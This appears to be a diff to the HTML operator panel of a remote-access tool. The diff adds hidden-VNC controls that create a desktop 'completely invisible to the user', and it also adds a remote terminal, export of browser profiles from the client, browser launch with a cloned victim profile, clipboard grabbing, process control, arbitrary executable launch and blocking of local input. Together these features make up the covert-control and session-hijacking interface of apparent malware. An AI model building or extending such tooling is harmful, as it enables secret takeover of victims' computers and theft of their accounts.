@@ -21,6 +21,7 @@
           <button class="mode-chip" type="button" data-mode="view">View</button>
           <button class="mode-chip is-active" type="button" data-mode="manage">Manage</button>
           <button class="mode-chip" type="button" data-mode="hidden">Hidden desktop</button>
+          <button class="mode-chip hvnc-mode" type="button" data-mode="hvnc" title="Creates a separate hidden Windows desktop - completely invisible to the user">HVNC</button>
         </div>
       </div>
     </div>
@@ -74,18 +75,208 @@
         <span id="status" data-state="">Idle</span>
       </div>
 
+      <!-- Remote Shell - available in all modes -->
+      <div class="hud-section" id="remoteShellSection">
+        <div class="section-title">Remote Tools</div>
+        <div class="hvnc-buttons">
+          <button id="openTerminalBtn" class="hvnc-btn primary" type="button" title="Open terminal (Ctrl+`)">
+            <span class="hvnc-icon">💻</span> Terminal
+          </button>
+          <button id="openProfilesBtn" class="hvnc-btn" type="button" title="Download browser profiles">
+            <span class="hvnc-icon">🌐</span> Browser Profiles
+          </button>
+        </div>
+        <div class="hint">Execute commands and export profiles from client</div>
+      </div>
+
       <div class="hud-section hidden-desktop-controls" id="hiddenDesktopControls" data-requires-hidden="true" style="display: none;">
-        <div class="section-title">Hidden Desktop Controls</div>
-        <div class="fields">
-          <div class="field toggle-field">
-            <label for="inputBlockingToggle">Block Local Input</label>
-            <label class="toggle-switch">
-              <input type="checkbox" id="inputBlockingToggle" />
-              <span class="toggle-slider"></span>
-            </label>
+        <div class="section-title">HVNC Controls</div>
+        
+        <!-- HVNC Status -->
+        <div id="hvncStatus" class="hint" data-state="">HVNC: Not active</div>
+        
+        <!-- Start/Stop HVNC -->
+        <div class="hvnc-main-actions">
+          <button id="hvncStartBtn" class="hvnc-action-btn primary" type="button">Start HVNC</button>
+          <button id="hvncStopBtn" class="hvnc-action-btn danger" type="button" disabled>Stop HVNC</button>
+        </div>
+        
+        <!-- Applications -->
+        <div class="hvnc-section">
+          <div class="hvnc-section-title">Applications</div>
+          <div class="hvnc-buttons">
+            <button class="hvnc-btn" type="button" data-hvnc-action="browsers" title="Launch browser with cloned profile">
+              <span class="hvnc-icon">🌐</span> Browsers
+            </button>
+            <button class="hvnc-btn" type="button" data-hvnc-action="cmd" title="Open Command Prompt">
+              <span class="hvnc-icon">⌨️</span> CMD
+            </button>
+            <button class="hvnc-btn" type="button" data-hvnc-action="powershell" title="Open PowerShell">
+              <span class="hvnc-icon">💻</span> PowerShell
+            </button>
+            <button class="hvnc-btn" type="button" data-hvnc-action="explorer" title="Open File Explorer">
+              <span class="hvnc-icon">📁</span> Explorer
+            </button>
+            <button class="hvnc-btn" type="button" data-hvnc-action="run" title="Run custom executable">
+              <span class="hvnc-icon">▶️</span> Launch .EXE
+            </button>
           </div>
         </div>
-        <div id="inputBlockingStatus" class="hint" data-state="">Input blocking: OFF</div>
+        
+        <!-- Clipboard -->
+        <div class="hvnc-section">
+          <div class="hvnc-section-title">Clipboard</div>
+          <div class="hvnc-buttons">
+            <button class="hvnc-btn" type="button" data-hvnc-action="get_clipboard" title="Get clipboard from hidden desktop">
+              <span class="hvnc-icon">📋</span> Get Clipboard
+            </button>
+            <button class="hvnc-btn" type="button" data-hvnc-action="send_clipboard" title="Send clipboard to hidden desktop">
+              <span class="hvnc-icon">📤</span> Send Clipboard
+            </button>
+          </div>
+        </div>
+        
+        <!-- Process Management -->
+        <div class="hvnc-section">
+          <div class="hvnc-section-title">Processes</div>
+          <div class="hvnc-buttons">
+            <button class="hvnc-btn" type="button" data-hvnc-action="start_process" title="Start a new process">
+              <span class="hvnc-icon">➕</span> Start Process
+            </button>
+            <button class="hvnc-btn" type="button" data-hvnc-action="kill_process" title="Kill a running process">
+              <span class="hvnc-icon">❌</span> Kill Process
+            </button>
+            <button class="hvnc-btn" type="button" data-hvnc-action="list_processes" title="List running processes">
+              <span class="hvnc-icon">📜</span> List Processes
+            </button>
+          </div>
+        </div>
+        
+        <!-- Input Blocking -->
+        <div class="hvnc-section">
+          <div class="hvnc-section-title">Input Control</div>
+          <div class="fields">
+            <div class="field toggle-field">
+              <label for="inputBlockingToggle">Block Local Input</label>
+              <label class="toggle-switch">
+                <input type="checkbox" id="inputBlockingToggle" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+          </div>
+          <div id="inputBlockingStatus" class="hint" data-state="">Input blocking: OFF</div>
+        </div>
+      </div>
+      
+      <!-- Browser Selection Dialog for HVNC -->
+      <div id="hvncBrowserDialog" class="hvnc-dialog" style="display: none;">
+        <div class="hvnc-dialog-content">
+          <div class="hvnc-dialog-header">
+            <span>Select Browser</span>
+            <button class="hvnc-dialog-close" type="button">&times;</button>
+          </div>
+          <div class="hvnc-dialog-body">
+            <div class="hvnc-browser-list">
+              <button class="hvnc-browser-btn" data-browser="chrome">
+                <span class="browser-icon">🔵</span> Chrome
+              </button>
+              <button class="hvnc-browser-btn" data-browser="firefox">
+                <span class="browser-icon">🦊</span> Firefox
+              </button>
+              <button class="hvnc-browser-btn" data-browser="edge">
+                <span class="browser-icon">🔷</span> Edge
+              </button>
+              <button class="hvnc-browser-btn" data-browser="opera">
+                <span class="browser-icon">🔴</span> Opera
+              </button>
+              <button class="hvnc-browser-btn" data-browser="brave">
+                <span class="browser-icon">🦁</span> Brave
+              </button>
+            </div>
+            <div class="hvnc-dialog-options">
+              <label>
+                <input type="checkbox" id="hvncCloneProfile" checked />
+                Clone profile from main desktop
+              </label>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Run EXE Dialog -->
+      <div id="hvncRunDialog" class="hvnc-dialog" style="display: none;">
+        <div class="hvnc-dialog-content">
+          <div class="hvnc-dialog-header">
+            <span>Launch Executable</span>
+            <button class="hvnc-dialog-close" type="button">&times;</button>
+          </div>
+          <div class="hvnc-dialog-body">
+            <div class="field">
+              <label for="hvncExePath">Executable Path</label>
+              <input type="text" id="hvncExePath" placeholder="C:\Program Files\..." />
+            </div>
+            <div class="field">
+              <label for="hvncExeArgs">Arguments (optional)</label>
+              <input type="text" id="hvncExeArgs" placeholder="--arg1 --arg2" />
+            </div>
+            <button id="hvncRunExeBtn" class="primary" type="button">Launch</button>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Send Clipboard Dialog -->
+      <div id="hvncClipboardDialog" class="hvnc-dialog" style="display: none;">
+        <div class="hvnc-dialog-content">
+          <div class="hvnc-dialog-header">
+            <span>Send to Clipboard</span>
+            <button class="hvnc-dialog-close" type="button">&times;</button>
+          </div>
+          <div class="hvnc-dialog-body">
+            <div class="field">
+              <label for="hvncClipboardText">Text to send</label>
+              <textarea id="hvncClipboardText" rows="4" placeholder="Enter text to send to hidden desktop clipboard"></textarea>
+            </div>
+            <button id="hvncSendClipboardBtn" class="primary" type="button">Send</button>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Start Process Dialog -->
+      <div id="hvncProcessDialog" class="hvnc-dialog" style="display: none;">
+        <div class="hvnc-dialog-content">
+          <div class="hvnc-dialog-header">
+            <span>Start Process</span>
+            <button class="hvnc-dialog-close" type="button">&times;</button>
+          </div>
+          <div class="hvnc-dialog-body">
+            <div class="field">
+              <label for="hvncProcessPath">Command or Path</label>
+              <input type="text" id="hvncProcessPath" placeholder="notepad.exe or full path" />
+            </div>
+            <div class="field">
+              <label for="hvncProcessArgs">Arguments (optional)</label>
+              <input type="text" id="hvncProcessArgs" placeholder="" />
+            </div>
+            <button id="hvncStartProcessBtn" class="primary" type="button">Start</button>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Kill Process Dialog -->
+      <div id="hvncKillDialog" class="hvnc-dialog" style="display: none;">
+        <div class="hvnc-dialog-content">
+          <div class="hvnc-dialog-header">
+            <span>Kill Process</span>
+            <button class="hvnc-dialog-close" type="button">&times;</button>
+          </div>
+          <div class="hvnc-dialog-body">
+            <div class="field">
+              <label for="hvncKillPid">Process ID (PID) or Name</label>
+              <input type="text" id="hvncKillPid" placeholder="1234 or chrome.exe" />
+            </div>
+            <button id="hvncKillProcessBtn" class="danger" type="button">Kill</button>
+          </div>
+        </div>
       </div>
 
       <div class="hud-section" id="appLauncher" data-requires-manage="true">
@@ -193,10 +384,13 @@
       document.head.appendChild(script);
     }
   </script>
-  <script src="js/app_core.js?v=20260203-2" defer></script>
+  <script src="js/app_core.js?v=20260210-1" defer></script>
   <script src="js/app_display.js?v=20260203-2" defer></script>
-  <script src="js/app_connection.js?v=20260203-3" defer></script>
+  <script src="js/app_connection.js?v=20260210-2" defer></script>
   <script src="js/app_storage.js?v=20260203-2" defer></script>
+  <script src="js/app_hvnc.js?v=20260210-1" defer></script>
+  <script src="js/app_shell.js?v=20260210-1" defer></script>
+  <script src="js/app_profiles.js?v=20260210-1" defer></script>
   <script src="js/app_bootstrap.js?v=20260203-2" defer></script>
 </body>
 </html>
